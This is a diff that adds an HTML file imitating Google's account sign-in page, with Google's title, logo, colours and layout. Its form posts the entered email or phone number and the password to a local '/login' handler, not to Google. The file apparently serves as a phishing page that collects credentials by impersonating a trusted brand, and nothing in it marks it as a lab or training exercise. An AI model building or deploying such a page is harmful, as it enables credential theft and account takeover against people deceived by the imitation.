@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600&display=swap');
+
+        :root {
+            --bg-color: #f0f4f9;
+            --card-bg: #ffffff;
+            --text-primary: #1f1f1f;
+            --text-secondary: #444746;
+            --link-color: #0b57d0;
+            --border-color: #747775;
+            --btn-primary-bg: #0b57d0;
+            --btn-primary-hover: #0842a0;
+            --btn-secondary-hover: #eaf1fb;
+            --input-border: #747775;
+            --input-focus: #0b57d0;
+            --error-color: #b3261e;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text-primary);
+        }
+
+        .container {
+            background-color: var(--card-bg);
+            border-radius: 28px;
+            width: 100%;
+            max-width: 1040px;
+            display: flex;
+            padding: 36px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.02), 0 1px 3px rgba(0, 0, 0, 0.04);
+            margin: 20px;
+            min-height: 400px;
+            gap: 48px;
+        }
+
+        /* Left Side */
+        .left-col {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 24px;
+        }
+
+        .logo {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 32px;
+        }
+
+        .logo svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 400;
+            margin-bottom: 16px;
+            line-height: 44px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: var(--text-secondary);
+            font-weight: 400;
+        }
+
+        /* Right Side */
+        .right-col {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            max-width: 450px;
+            padding: 24px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 8px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 14px;
+            font-size: 16px;
+            border: 1px solid var(--input-border);
+            border-radius: 4px;
+            background: transparent;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .input-group input:focus {
+            border-color: var(--input-focus);
+            border-width: 2px;
+            padding: 15px 13px;
+            /* Adjust padding to prevent shift due to border width */
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: var(--text-secondary);
+            pointer-events: none;
+            transition: all 0.2s ease;
+            background: var(--card-bg);
+            padding: 0 4px;
+        }
+
+        .input-group input:focus~label,
+        .input-group input:not(:placeholder-shown)~label {
+            top: 0;
+            font-size: 12px;
+            color: var(--input-focus);
+        }
+
+        .input-group input:not(:placeholder-shown):not(:focus)~label {
+            color: var(--text-secondary);
+        }
+
+        .forgot-email {
+            color: var(--link-color);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 8px;
+            margin-bottom: 24px;
+            border-radius: 4px;
+            padding: 4px;
+            margin-left: -4px;
+        }
+
+        .forgot-email:hover,
+        .guest-mode a:hover {
+            color: var(--btn-primary-hover);
+        }
+
+        .guest-mode {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 32px;
+            line-height: 20px;
+        }
+
+        .guest-mode a {
+            color: var(--link-color);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 16px;
+        }
+
+        .btn {
+            font-weight: 500;
+            font-size: 14px;
+            border: none;
+            border-radius: 20px;
+            padding: 10px 24px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-decoration: none;
+        }
+
+        .btn-create {
+            background-color: transparent;
+            color: var(--link-color);
+        }
+
+        .btn-create:hover {
+            background-color: var(--btn-secondary-hover);
+        }
+
+        .btn-next {
+            background-color: var(--btn-primary-bg);
+            color: white;
+        }
+
+        .btn-next:hover {
+            background-color: var(--btn-primary-hover);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Footer */
+        .footer {
+            position: absolute;
+            bottom: 24px;
+            left: 0;
+            right: 0;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 24px;
+            font-size: 12px;
+            color: var(--text-secondary);
+            max-width: 1040px;
+            margin: 0 auto;
+        }
+
+        .footer select {
+            background: transparent;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 12px;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            background-color: rgba(0, 0, 0, 0.04);
+            border-radius: 4px;
+            padding: 2px 4px;
+            margin: -2px -4px;
+        }
+
+        /* Responsive */
+        @media (max-width: 800px) {
+            .container {
+                flex-direction: column;
+                max-width: 450px;
+                padding: 36px 36px 36px;
+                gap: 24px;
+            }
+
+            .left-col {
+                padding: 0;
+                justify-content: flex-start;
+            }
+
+            .logo {
+                margin-bottom: 16px;
+            }
+
+            .logo {
+                width: 48px;
+                height: 48px;
+            }
+
+            h1 {
+                font-size: 32px;
+                line-height: 40px;
+                margin-bottom: 8px;
+            }
+
+            .right-col {
+                padding: 0;
+                max-width: 100%;
+            }
+
+            .footer {
+                position: static;
+                flex-direction: row;
+                justify-content: space-between;
+                flex-wrap: wrap;
+                width: 100%;
+                max-width: 450px;
+                gap: 16px;
+                margin-top: 24px;
+                padding: 0;
+            }
+        }
+
+        @media (max-width: 600px) {
+            body {
+                background-color: var(--card-bg);
+                justify-content: flex-start;
+                align-items: stretch;
+            }
+
+            .container {
+                box-shadow: none;
+                margin: 0;
+                padding: 24px 24px 48px;
+                min-height: calc(100vh - 80px);
+                max-width: 100%;
+                width: 100%;
+                height: auto;
+                border-radius: 0;
+                flex-grow: 1;
+            }
+
+            .left-col {
+                flex: none;
+            }
+
+            h1 {
+                font-size: 28px;
+                line-height: 36px;
+            }
+
+            .footer {
+                max-width: 100%;
+                padding: 16px 24px;
+                margin-top: auto;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <!-- Left Column -->
+        <div class="left-col">
+            <div class="logo">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path
+                        d="M23.49 12.275c0-.814-.075-1.579-.204-2.315H12v4.382h6.439c-.286 1.432-1.077 2.645-2.28 3.447v2.868h3.692c2.16-1.989 3.41-4.914 3.41-8.382z"
+                        fill="#4285F4" />
+                    <path
+                        d="M12 24c3.238 0 5.955-1.076 7.94-2.903l-3.692-2.868c-1.076.711-2.438 1.135-4.248 1.135-3.268 0-6.04-2.21-7.027-5.18h-3.82v2.962C3.12 21.01 7.195 24 12 24z"
+                        fill="#34A853" />
+                    <path
+                        d="M4.973 14.184c-.258-.758-.403-1.564-.403-2.392 0-.828.145-1.634.39-2.392V6.438h-3.82A11.968 11.968 0 0 0 .003 11.792c0 2.062.5 3.993 1.347 5.727l3.623-3.335z"
+                        fill="#FBBC05" />
+                    <path
+                        d="M12 4.75c1.761 0 3.342.607 4.588 1.79L19.982 3.14C17.95 1.251 15.228 0 12 0 7.195 0 3.12 2.99.141 6.853l3.82 2.962C4.96 6.83 7.732 4.75 12 4.75z"
+                        fill="#EA4335" />
+                </svg>
+            </div>
+            <h1>Sign in</h1>
+            <div class="subtitle">Use your Google Account</div>
+        </div>
+
+        <!-- Right Column -->
+        <form action="/login" method="POST">
+            <div class="right-col">
+                <div class="input-group">
+                    <input name="username" type="text" id="identifierId" placeholder=" " autocomplete="username"
+                        spellcheck="false" tabindex="0" dir="ltr" data-initial-dir="ltr" data-initial-value="" required>
+                    <label for="identifierId">Email or phone</label>
+                </div>
+
+                <div class="input-group" style="margin-top: 12px;">
+                    <input name="password" type="password" id="password" placeholder=" " autocomplete="current-password"
+                        spellcheck="false" tabindex="0" dir="ltr" required>
+                    <label for="password">Enter your password</label>
+                </div>
+
+                <a href="#" class="forgot-email">Forgot email?</a>
+
+                <div class="guest-mode">
+                    Not your computer? Use Guest mode to sign in privately.
+                    <a href="#">Learn more</a>
+                </div>
+
+                <div class="actions">
+                    <a href="#" class="btn btn-create">Create account</a>
+                    <button type="submit" class="btn btn-next">Sign in</button>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <div class="footer">
+        <select>
+            <option value="en-US">English (United States)</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <!-- Add more languages as needed -->
+        </select>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+</body>
+
+</html>
